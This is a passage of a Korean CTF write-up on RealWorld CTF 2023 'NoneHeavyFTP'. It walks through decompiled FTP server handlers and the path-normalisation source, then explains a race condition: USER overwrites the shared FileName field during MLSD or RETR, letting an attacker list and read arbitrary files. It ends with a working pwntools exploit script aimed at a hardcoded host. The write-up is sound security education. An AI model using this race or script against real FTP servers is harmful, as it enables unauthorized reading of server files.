  }
  if ( align )
    gnutls_record_send();
  else
    send(a1[1].__lock, "451 Requested action aborted. Local error in processing.\r\n", 0x3AuLL, 0x4000);
  v5 = a1;
LABEL_19:
  v5[1].__kind = -1;
  __pthread_unregister_cancel(&buf);
  pthread_mutex_unlock(v5);
  return 0LL;
}
```
create_datasocket으로 데이터 소켓을 따로 연다.
그리고 opendir, readdir을 해주고 datasocket으로 결과를 보내준다.

```c
__int64 __fastcall mlsd_sub(__int64 a1, int a2, __int64 a3, _BYTE *a4)
{
  __int64 result; // rax
  size_t v6; // rdx
  struct tm v7; // [rsp+0h] [rbp-2118h] BYREF
  struct stat64 v8; // [rsp+40h] [rbp-20D8h] BYREF
  char file[24]; // [rsp+D0h] [rbp-2048h] BYREF
  unsigned __int64 v10; // [rsp+20D8h] [rbp-40h]

  v10 = __readfsqword(0x28u);
  if ( a4[19] != 46 || (result = 1LL, a4[20]) )
  {
    if ( a4[19] != 46 || a4[20] != 46 || (result = 1LL, a4[21]) )
    {
      __snprintf_chk((__int64)file, 0x2000LL, 1LL, 0x2000LL, "%s/%s");
      if ( !lstat64(file, &v8) )
      {
        localtime_r(&v8.st_mtim.tv_sec, &v7);
        ++v7.tm_mon;
        __snprintf_chk(
          (__int64)file,
          0x2000LL,
          1LL,
          0x2000LL,
          "type=%s;%s=%llu;UNIX.mode=%lo;UNIX.owner=%lu;UNIX.group=%lu;modify=%u%02u%02u%02u%02u%02u; %s\r\n");
      }
      v6 = strlen(file);
      if ( a3 )
        return gnutls_record_send() >= 0;
      else
        return send(a2, file, v6, 0x4000) >= 0;
    }
  }
  return result;
}
```
mlsd_sub 함수가 결과를 보내주는 역할을 한다.

```c
_BOOL8 __fastcall ftpPASV(__int64 a1)
{
  size_t v1; // rdx

  if ( *(_DWORD *)(a1 + 88) )
  {
    if ( *(_DWORD *)(a1 + 56) )
    {
      if ( (unsigned int)pasv_part_0() )
      {
        __snprintf_chk(a1 + 12408, 0x2000LL, 1LL, 0x2000LL, "227 Entering Passive Mode (%u,%u,%u,%u,%u,%u).\r\n");
        writelogentry(a1, (__int64)" entering passive mode", (__int64)"");
        v1 = strlen((const char *)(a1 + 12408));
        if ( *(_QWORD *)(a1 + 20600) )
          return gnutls_record_send() >= 0;
        else
          return send(*(_DWORD *)(a1 + 40), (const void *)(a1 + 12408), v1, 0x4000) >= 0;
      }
      else
      {
        return 1LL;
      }
    }
    else
    {
      if ( *(_QWORD *)(a1 + 20600) )
        gnutls_record_send();
      else
        send(*(_DWORD *)(a1 + 40), "550 Another action is in progress, use ABOR command first.\r\n", 0x3CuLL, 0x4000);
      return 1LL;
    }
  }
  else
  {
    if ( *(_QWORD *)(a1 + 20600) )
      gnutls_record_send();
    else
      send(*(_DWORD *)(a1 + 40), "530 Please login with USER and PASS.\r\n", 0x26uLL, 0x4000);
    return 1LL;
  }
}
```
ftp 패시브 모드가 구현된 함수다.
포트를 열어주고 유저가 특정 포트로 접속해서 데이터를 받는 형식이다.

```c
_BOOL8 __fastcall ftpRETR(pthread_mutex_t *mutex, __int64 a2)
{
  int owner; // edx
  int lock; // edi
  int v5; // eax
  __int64 align; // rdi
  int v8; // eax
  pthread_t newthread; // [rsp+8h] [rbp-C0h] BYREF
  struct stat64 v10; // [rsp+10h] [rbp-B8h] BYREF
  unsigned __int64 v11; // [rsp+A8h] [rbp-20h]

  owner = mutex[2].__owner;
  v11 = __readfsqword(0x28u);
  if ( !owner )
  {
    if ( !mutex[515].__align )
      return send(mutex[1].__lock, "530 Please login with USER and PASS.\r\n", 0x26uLL, 0x4000) >= 0;
    return gnutls_record_send() >= 0;
  }
  if ( !mutex[1].__kind )
  {
    if ( !mutex[515].__align )
      return send(mutex[1].__lock, "550 Another action is in progress, use ABOR command first.\r\n", 0x3CuLL, 0x4000) >= 0;
    return gnutls_record_send() >= 0;
  }
  if ( !a2 )
  {
    if ( !mutex[515].__align )
      return send(mutex[1].__lock, "501 Syntax error in parameters or arguments.\r\n", 0x2EuLL, 0x4000) >= 0;
    return gnutls_record_send() >= 0;
  }
  lock = mutex[2].__lock;
  if ( lock != -1 )
  {
    close(lock);
    mutex[2].__lock = -1;
  }
  ftp_effective_path(&mutex[105].__align + 2, &mutex[3], a2, 0x2000LL, &mutex[310].__align + 1);
  v5 = stat64(&mutex[310].__size[8], &v10);
  align = mutex[515].__align;
  if ( v5 || (v10.st_mode & 0xF000) == 0x4000 )
  {
    if ( align )
      return gnutls_record_send() >= 0;
    else
      return send(mutex[1].__lock, "550 File or directory unavailable.\r\n", 0x24uLL, 0x4000) >= 0;
  }
  else
  {
    if ( align )
      gnutls_record_send();
    else
      send(mutex[1].__lock, "150 File status okay; about to open data connection.\r\n", 0x36uLL, 0x4000);
    writelogentry((__int64)mutex, (__int64)" RETR: ", a2);
    mutex[1].__spins = 0;
    pthread_mutex_lock(mutex);
    v8 = pthread_create(&newthread, 0LL, retr_thread, mutex);
    mutex[1].__kind = v8;
    if ( v8 )
    {
      if ( mutex[515].__align )
        gnutls_record_send();
      else
        send(mutex[1].__lock, "451 Requested action aborted. Local error in processing.\r\n", 0x3AuLL, 0x4000);
    }
    else
    {
      *(&mutex[1].__align + 1) = newthread;
    }
    pthread_mutex_unlock(mutex);
    return 1LL;
  }
}
```
RETR 명령어가 구현된 함수다.
파일을 읽는데 필요하다.
```c
void *__fastcall retr_thread(__int64 a1)
{
  void *v1; // rbp
  void *max_size; // r13
  int v4; // eax
  int v5; // r12d
  char v6; // r14
  __int64 v7; // rdi
  __int64 v8; // rbx
  __int64 v9; // rax
  signed __int64 v10; // rax
  signed __int64 v11; // r14
  __int64 v13; // [rsp+18h] [rbp-D0h]
  int fd; // [rsp+24h] [rbp-C4h]
  __int64 v15; // [rsp+28h] [rbp-C0h] BYREF
  struct timespec tp; // [rsp+30h] [rbp-B8h] BYREF
  __pthread_unwind_buf_t buf; // [rsp+40h] [rbp-A8h] BYREF

  buf.__pad[4] = (void *)__readfsqword(0x28u);
  pthread_mutex_lock((pthread_mutex_t *)a1);
  if ( __sigsetjmp((struct __jmp_buf_tag *)&buf, 0) )
  {
    cleanup_handler((pthread_mutex_t *)a1);
    __pthread_unwind_next(&buf);
  }
  __pthread_register_cancel(&buf);
  v15 = 0LL;
  clock_gettime(1, &tp);
  v1 = malloc((size_t)&_data_start);
  if ( !v1 )
  {
    *(_DWORD *)(a1 + 80) = -1;
    goto LABEL_26;
  }
  fd = create_datasocket(a1);
  if ( fd != -1 )
  {
    if ( *(_QWORD *)(a1 + 20600) )
    {
      if ( !(unsigned int)ftp_init_tls_session(&v15, fd, 0) )
        goto LABEL_6;
      max_size = (void *)gnutls_record_get_max_size(v15);
      if ( max_size > &_data_start )
        max_size = &_data_start;
    }
    else
    {
      max_size = &_data_start;
    }
    v4 = open64((const char *)(a1 + 12408), 0);
    *(_DWORD *)(a1 + 80) = v4;
    v5 = v4;
    if ( v4 != -1 )
    {
      v6 = 0;
      if ( *(_QWORD *)(a1 + 104) == lseek64(v4, *(_QWORD *)(a1 + 104), 0) )
      {
        if ( *(_DWORD *)(a1 + 60) )
        {
          v13 = 0LL;
          v6 = 1;
        }
        else
        {
          v8 = 0LL;
          do
          {
            v10 = read(v5, v1, (size_t)max_size);
            v11 = v10;
            if ( !v10 )
              break;
            if ( v10 >= 0 )
            {
              v9 = v15 ? gnutls_record_send() : send(fd, v1, v10, 0x4000);
              if ( v11 == v9 )
                continue;
            }
            v13 = v8;
            v6 = 0;
            goto LABEL_41;
            v8 += v11;
          }
          while ( !*(_DWORD *)(a1 + 60) );
          v13 = v8;
          v6 = 1;
        }
LABEL_41:
        clock_gettime(1, &tp);
        *(_QWORD *)(a1 + 20616) += v13;
        ++*(_QWORD *)(a1 + 20632);
        __snprintf_chk(
          (char *)v1,
          (__int64)max_size,
          1LL,
          (__int64)&_data_start,
          " RETR complete. %zd bytes (%f MBytes) total sent in %f seconds (%f MBytes/s)");
        writelogentry(a1, (__int64)v1, (__int64)"");
      }
      close(v5);
      *(_DWORD *)(a1 + 0x50) = -1;
      free(v1);
      v7 = *(_QWORD *)(a1 + 0x5078);
      if ( !*(_DWORD *)(a1 + 0x3C) && v6 )
      {
        if ( !v7 )
        {
          send(*(_DWORD *)(a1 + 40), "226 Transfer complete. Closing data connection.\r\n", 0x31uLL, 0x4000);
          goto LABEL_9;
        }
        goto LABEL_8;
      }
LABEL_7:
      if ( !*(_QWORD *)(a1 + 0x5078) )
      {
        send(*(_DWORD *)(a1 + 40), "426 Connection closed; transfer aborted.\r\n", 0x2AuLL, 0x4000);
        goto LABEL_9;
      }
LABEL_8:
      gnutls_record_send();
LABEL_9:
      close(fd);
      *(_DWORD *)(a1 + 44) = -1;
      goto LABEL_10;
    }
  }
LABEL_6:
  *(_DWORD *)(a1 + 80) = -1;
  free(v1);
  if ( fd != -1 )
    goto LABEL_7;
LABEL_26:
  if ( *(_QWORD *)(a1 + 20600) )
    gnutls_record_send();
  else
    send(*(_DWORD *)(a1 + 40), "451 Requested action aborted. Local error in processing.\r\n", 0x3AuLL, 0x4000);
LABEL_10:
  if ( v15 )
  {
    gnutls_bye();
    gnutls_deinit();
  }
  *(_DWORD *)(a1 + 56) = -1;
  __pthread_unregister_cancel(&buf);
  pthread_mutex_unlock((pthread_mutex_t *)a1);
  return 0LL;
}
```
쓰레드로 돌아간다.
다른 함수랑 비슷하게 mutex 걸고 간다.
파일을 읽고 datasocket으로 보내준다.

ftp_effective_path 함수는 소스코드를 읽으면서 분석했다.
```c

int ftp_normalize_path(char* path, size_t npath_len, char* npath)
{
    char* p0;
    size_t          node_len;
    int             status = 1;
    pftp_path_node  nodes = NULL, newnode;

    if ((path == NULL) || (npath == NULL) || (npath_len < 2))
        return 0;

    if (*path == '/')
    {
        *npath = '/';
        ++path;
        ++npath;
        --npath_len;
    }

    p0 = path;

    while (*path != 0)
    {
        while ((*path != '/') && (*path != '\0'))
            ++path;

        node_len = path - p0;

        while (node_len > 0)
        {
            /* we have a "this dir" sign: just skip it */
            if (strncmp(p0, ".", node_len) == 0)
                break;

            if (strncmp(p0, "..", node_len) == 0)
            {
                /* we have a "dir-up" sign: unlink and free prev node */
                if (nodes)
                {
                    newnode = nodes->prev;
                    free(nodes);
                    if (newnode)
                        newnode->next = NULL;
                    nodes = newnode;
                }
            }
            else
            {
                newnode = x_malloc(sizeof(ftp_path_node));
                newnode->value = p0;
                newnode->length = node_len;
                newnode->next = NULL;
                newnode->prev = nodes;

                if (nodes)
                    nodes->next = newnode;

                nodes = newnode;
            }

            break;
        }

        if (*path != 0)
            ++path;

        p0 = path;
    }

    /* return to head */
    newnode = nodes;
    while (newnode)
    {
        nodes = newnode;
        newnode = newnode->prev;
    }

    while (nodes)
    {
        if (npath_len < nodes->length + 1)
        {
            status = 0;
            break;
        }

        strncpy(npath, nodes->value, nodes->length);
        npath += nodes->length;
        *npath = '/';
        ++npath;
        npath_len -= nodes->length + 1;

        newnode = nodes;
        nodes = newnode->next;
        free(newnode);
    }

    /* free the remaining nodes in case of break */
    while (nodes)
    {
        newnode = nodes;
        nodes = newnode->next;
        free(newnode);
    }

    if ((npath_len == 0) || (status == 0))
        return 0;

    *npath = '\0';
    return 1;
}

int ftp_effective_path(char *root_path, char *current_path,
        char *file_path, size_t result_size, char *result)
{
    char    path[PATH_MAX*2], normalized_path[PATH_MAX];
    int     status;
    size_t  len;

    memset(result, 0, result_size);

    if (file_path == NULL)
        file_path = "";

    if (*file_path == '/')
    {
        status = ftp_normalize_path(file_path, PATH_MAX, normalized_path);
    }
    else
    {
        snprintf(path, PATH_MAX*2, "%s/%s", current_path, file_path);
        status = ftp_normalize_path(path, PATH_MAX, normalized_path);
    }

    if (status == 0)
        return 0;

    snprintf(path, PATH_MAX*2, "%s/%s", root_path, normalized_path);
    status = ftp_normalize_path(path, result_size, result);

    /* delete last slash */
    len = strlen(result);
    if (len >= 2)
    {
        if (result[len-1] == '/')
            result[len-1] = '\0';
    }

    return status;
}
```
기본적으로 root path와 file path를 마지막에 붙여준다.
..이나 .같은 상대주소 처리도 제대로 구현되어있다.

분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.
```c
typedef struct _FTPCONTEXT {
    pthread_mutex_t     MTLock;
    SOCKET              ControlSocket;
    SOCKET              DataSocket;
    pthread_t           WorkerThreadId;
    /*
     * WorkerThreadValid is output of pthread_create
     * therefore zero is VALID indicator and -1 is invalid.
     */
    int                 WorkerThreadValid;
    int                 WorkerThreadAbort;
    in_addr_t           ServerIPv4;
    in_addr_t           ClientIPv4;
    in_addr_t           DataIPv4;
    in_port_t           DataPort;
    int                 File;
    int                 Mode;
    int                 Access;
    int                 SessionID;
    int                 DataProtectionLevel;
    off_t               RestPoint;
    uint64_t            BlockSize;
    char                CurrentDir[PATH_MAX];
    char                RootDir[PATH_MAX];
    char                RnFrom[PATH_MAX];
    char                FileName[2*PATH_MAX];
    gnutls_session_t    TLS_session;
    SESSION_STATS       Stats;
} FTPCONTEXT, *PFTPCONTEXT;
```
함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다.
File이나, Access, Mode같은 필드들이 있었다.

## Exploitation
```c
int ftpUSER(PFTPCONTEXT context, const char *params)
{
    if ( params == NULL )
        return sendstring(context, error501);

    context->Access = FTP_ACCESS_NOT_LOGGED_IN;

    writelogentry(context, " USER: ", (char *)params);
    snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);
    sendstring(context, context->FileName);

    /* Save login name to FileName for the next PASS command */
    strcpy(context->FileName, params);
    return 1;
}
```
ftpUSER에서 FileName이 덮힌다.
ftp_effective_path에서
```c
snprintf(path, PATH_MAX*2, "%s/%s", root_path, normalized_path);
```
위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다. 

```c
    ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);

    while (stat(context->FileName, &filestats) == 0)
    {
        if ( !S_ISDIR(filestats.st_mode) )
            break;

        sendstring(context, interm150);
        writelogentry(context, " MLSD-LIST ", (char *)params);
        context->WorkerThreadAbort = 0;

        pthread_mutex_lock(&context->MTLock);
```
ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context->FileName을 체크하는 것을 알 수 있다.
이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다.
그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다.
그때는 왜 lock 되어있는데 값이 바뀌는지 궁금했지만, 그냥 되길래 익스플로잇 코드를 짰었다.

mutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다. 
만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.
```c
int ftpUSER(PFTPCONTEXT context, const char *params)
{
    if ( params == NULL )
        return sendstring(context, error501);

    context->Access = FTP_ACCESS_NOT_LOGGED_IN;

    writelogentry(context, " USER: ", (char *)params);
    snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);
    sendstring(context, context->FileName);

    /* Save login name to FileName for the next PASS command */
    strcpy(context->FileName, params);
    return 1;
}
```
ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.
```c
  ftp_effective_path((__int64)(&mutex[105].__align + 2), (__int64)&mutex[3], a2, 0x2000uLL, &mutex[310].__size[8]);
  v4 = stat64(&mutex[310].__size[8], &v9);      // get stat of file
  align = mutex[515].__align;
  if ( !v4 && (v9.st_mode & 0xF000) == 0x4000 )
  {
    if ( align )
      gnutls_record_send();
    else
      send(mutex[1].__lock, "150 File status okay; about to open data connection.\r\n", 0x36uLL, 0x4000);
    writelogentry((__int64)mutex, (__int64)" MLSD-LIST ", (__int64)a2);
    mutex[1].__spins = 0;
    pthread_mutex_lock(mutex);
    v7 = pthread_create(&newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex);
```
mlsd_thread를 호출한다.
그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.
```c
  buf.__pad[4] = (void *)__readfsqword(0x28u);
  pthread_mutex_lock(a1);
  if ( __sigsetjmp((struct __jmp_buf_tag *)&buf, 0) )
  {
    cleanup_handler(a1);
    __pthread_unwind_next(&buf);
  }
  v1 = 0;
  __pthread_register_cancel(&buf);
```
mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.

```c
  *(_QWORD *)fd = (unsigned int)create_datasocket(a1);
  if ( *(_DWORD *)fd != -1 )
  {
    if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(&fd[4], *(unsigned int *)fd, 0) )
    {
      v2 = opendir(&a1[310].__size[8]);         // open dir
      if ( v2 )
      {
        do
        {
          v3 = readdir64(v2);
          if ( !v3 )
            break;
          v1 = mlsd_sub(&a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)&fd[4], v3);
          if ( !v1 )
            break;
        }
        while ( !a1[1].__spins );
        closedir(v2);
      }
```
mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다.
그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.

fd로 결과를 보내준다.
이걸로 flag의 이름을 알 수 있다.

```c
  fd = create_datasocket(a1);
  if ( fd != -1 )
  {
    if ( *(_QWORD *)(a1 + 20600) )
    {
      if ( !(unsigned int)ftp_init_tls_session(&v15, fd, 0) )
        goto LABEL_6;
      max_size = (void *)gnutls_record_get_max_size(v15);
      if ( max_size > &_data_start )
        max_size = &_data_start;
    }
    else
    {
      max_size = &_data_start;
    }
    v4 = open64((const char *)(a1 + 12408), 0);
    *(_DWORD *)(a1 + 80) = v4;
    v5 = v4;
```
이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다.
당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.

```c
SOCKET create_datasocket(PFTPCONTEXT context)
{
    SOCKET				clientsocket = INVALID_SOCKET;
    struct sockaddr_in	laddr;
    socklen_t			asz;

    memset(&laddr, 0, sizeof(laddr));

    switch ( context->Mode ) {
    case MODE_NORMAL:
        clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        context->DataSocket = clientsocket;
        if ( clientsocket == INVALID_SOCKET )
            return INVALID_SOCKET;

        laddr.sin_family = AF_INET;
        laddr.sin_port = context->DataPort;
        laddr.sin_addr.s_addr = context->DataIPv4;
        if ( connect(clientsocket, (const struct sockaddr *)&laddr, sizeof(laddr)) == -1 ) {
            close(clientsocket);
            return INVALID_SOCKET;
        }
        break;

    case MODE_PASSIVE:
        asz = sizeof(laddr);
        clientsocket = accept(context->DataSocket, (struct sockaddr *)&laddr, &asz);
        close(context->DataSocket);
        context->DataSocket = clientsocket;

        if ( clientsocket == INVALID_SOCKET )
            return INVALID_SOCKET;

        context->DataIPv4 = 0;
        context->DataPort = 0;
        context->Mode = MODE_NORMAL;
        break;

    default:
        return INVALID_SOCKET;
    }
    return clientsocket;
}
```
PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.


```python
from pwn import *

sa = lambda x,y : p.sendafter(x,y)
s = lambda x : p.send(x)
rvu = lambda x : p.recvuntil(x)
local =False

if local==True:
    ip = '127.0.0.1'
    mip = b'127,0,0,1'
else :
    ip = '47.89.253.219'
    mip = b'0,0,0,0'

p = remote(ip,2121)
context.log_level='debug'
pay = b'USER anonymous\r\n'
sa(b'ready',pay)
pay = b'PASS AAAAA\r\n'
sa(b' OK',pay)
pay = b'PASV \r\n'
sa(b'logged in',pay)
pay = b'MLSD /\r\n'
sa(b'Passive',pay)
rvu(mip+b',')
recv = rvu(b')')[:-1].split(b',')
recv = [int(x) for x in recv]
port = recv[0] * 256 + recv[1]
success(f"nc {ip} {port}")
s(b'USER /\r\n')
print("flag name : ",end='')
flag = input()
s(b'USER anonymous\r\n')
sa(b' OK',b'PASS AAAAA\r\n')
sa(b'logged in',b'PASV \r\n')
rvu(mip+b',')
recv = rvu(b')')[:-1].split(b',')
recv = [int(x) for x in recv]
port = recv[0] * 256 + recv[1]
success(f"nc {ip} {port}")
flag = "/"+flag
pay = b'RETR /hello.txt\r\n'
s(pay)
s(f'USER {flag[:-1]}\r\n')

p.interactive()
```

![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image1.png)
nc로 직접 접속해줘야된다.
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1.png)
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image5.png)
flag 이름 넣어주고 다른 포트로 다시 접속하면 된다.
![](/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1-1.png)




